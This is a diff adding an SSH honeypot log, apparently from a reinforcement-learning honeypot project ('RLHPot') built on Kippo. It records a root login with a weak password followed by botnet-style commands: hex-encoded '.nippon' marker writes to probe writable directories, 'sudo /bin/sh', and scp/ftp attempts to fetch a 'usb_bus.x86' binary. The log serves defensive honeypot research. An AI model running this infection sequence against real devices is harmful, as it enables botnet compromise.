@@ -1,0 +1,387 @@
+2023-06-29 10:11:20-0700 [HoneyPotTransport,2,192.168.139.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa
+2023-06-29 10:11:20-0700 [HoneyPotTransport,2,192.168.139.1] outgoing: aes256-ctr hmac-sha1 none
+2023-06-29 10:11:20-0700 [HoneyPotTransport,2,192.168.139.1] incoming: aes256-ctr hmac-sha1 none
+2023-06-29 10:11:20-0700 [HoneyPotTransport,2,192.168.139.1] NEW KEYS
+2023-06-29 10:57:14-0700 [HoneyPotTransport,2,192.168.139.1] connection lost
+2023-06-29 14:26:38-0700 [-] Log opened.
+2023-06-29 14:26:38-0700 [-] twistd 15.1.0 (/usr/bin/python 2.7.12) starting up.
+2023-06-29 14:26:38-0700 [-] reactor class: twisted.internet.epollreactor.EPollReactor.
+2023-06-29 14:26:38-0700 [-] HoneyPotSSHFactory starting on 22
+2023-06-29 14:26:38-0700 [-] Starting factory <kippo.core.honeypot.HoneyPotSSHFactory instance at 0x7fb4ad4b62d8>
+2023-06-29 14:27:21-0700 [kippo.core.honeypot.HoneyPotSSHFactory] New connection: 192.168.139.1:61143 (192.168.139.158:22) [session: 0]
+2023-06-29 14:27:21-0700 [HoneyPotTransport,0,192.168.139.1] Remote SSH version: SSH-2.0-PuTTY_Release_0.78
+2023-06-29 14:27:21-0700 [HoneyPotTransport,0,192.168.139.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa
+2023-06-29 14:27:21-0700 [HoneyPotTransport,0,192.168.139.1] outgoing: aes256-ctr hmac-sha1 none
+2023-06-29 14:27:21-0700 [HoneyPotTransport,0,192.168.139.1] incoming: aes256-ctr hmac-sha1 none
+2023-06-29 14:27:23-0700 [HoneyPotTransport,0,192.168.139.1] NEW KEYS
+2023-06-29 14:27:23-0700 [HoneyPotTransport,0,192.168.139.1] starting service ssh-userauth
+2023-06-29 14:27:25-0700 [SSHService ssh-userauth on HoneyPotTransport,0,192.168.139.1] root trying auth none
+2023-06-29 14:27:28-0700 [SSHService ssh-userauth on HoneyPotTransport,0,192.168.139.1] root trying auth password
+2023-06-29 14:27:28-0700 [SSHService ssh-userauth on HoneyPotTransport,0,192.168.139.1] login attempt [root/123456] succeeded
+2023-06-29 14:27:28-0700 [SSHService ssh-userauth on HoneyPotTransport,0,192.168.139.1] root authenticated with password
+2023-06-29 14:27:28-0700 [SSHService ssh-userauth on HoneyPotTransport,0,192.168.139.1] starting service ssh-connection
+2023-06-29 14:27:28-0700 [SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] got channel session request
+2023-06-29 14:27:28-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] channel open
+2023-06-29 14:27:28-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] pty request: xterm (24, 80, 0, 0)
+2023-06-29 14:27:28-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Terminal size: 24 80
+2023-06-29 14:27:28-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getting shell
+2023-06-29 14:27:28-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Opening TTY log: log/tty/20230629-142728-6653.log
+2023-06-29 14:27:28-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /etc/motd resolved into /etc/motd
+2023-06-29 14:27:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: /gweerwe323f
+2023-06-29 14:27:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /gweerwe323f
+2023-06-29 14:27:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: sudo /bin/sh 
+2023-06-29 14:27:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: sudo /bin/sh
+2023-06-29 14:27:56-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: /bin/busybox cp
+2023-06-29 14:27:56-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /bin/busybox cp
+2023-06-29 14:27:59-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: scp johnv@192.168.100.101:usb_bus.x86
+2023-06-29 14:27:59-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: scp johnv@192.168.100.101:usb_bus.x86
+2023-06-29 14:28:03-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:  /gweerwe323f
+2023-06-29 14:28:03-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /gweerwe323f
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: mount
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: mount
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] start to get action ..
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start mount
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ mount
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:07-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Reading txtcmd from "/home/anh/Desktop/RLHPot/txtcmds/bin/mount"
+2023-06-29 14:28:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: /gweerwe323f
+2023-06-29 14:28:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /gweerwe323f
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/' > //.nippon   
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/' > //.nippon
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:  cat //.nippon ;rm -f //.nippon
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat //.nippon
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /.nippon resolved into /.nippon
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f //.nippon
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon   
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: cat /tmp/.nippon
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /tmp/.nippon
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:24-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /tmp/.nippon resolved into /tmp/.nippon
+2023-06-29 14:28:27-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: ftp 192.168.100.9
+2023-06-29 14:28:27-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: ftp 192.168.100.9
+2023-06-29 14:28:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: root
+2023-06-29 14:28:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: root
+2023-06-29 14:28:32-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: root
+2023-06-29 14:28:32-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: root
+2023-06-29 14:28:36-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: put usb_bus.x86.zip
+2023-06-29 14:28:36-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: put usb_bus.x86.zip
+2023-06-29 14:28:39-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: bye
+2023-06-29 14:28:39-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: bye
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: tar usb_bus.x86.zip
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: tar usb_bus.x86.zip
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start tar
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ tar
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    rm -f /tmp/.nippon
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /tmp/.nippon
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:53-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    cat /var/tmp/.nippon
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /var/tmp/.nippon
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:28:58-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /var/tmp/.nippon resolved into /var/tmp/.nippon
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    rm -f /var/tmp/.nippon
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /var/tmp/.nippon
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/' > //.nippon;   cat //.nippon
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/' > //.nippon
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat //.nippon
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /.nippon resolved into /.nippon
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   rm -f //.nippon
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f //.nippon
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:08-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/proc' > /proc/.nippon
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/proc' > /proc/.nippon
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:11-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    cat /proc/.nippon;   rm -f /proc/.nippon
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /proc/.nippon
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /proc/.nippon resolved into /proc/.nippon
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /proc/.nippon
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:15-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/sys' > /sys/.nippon
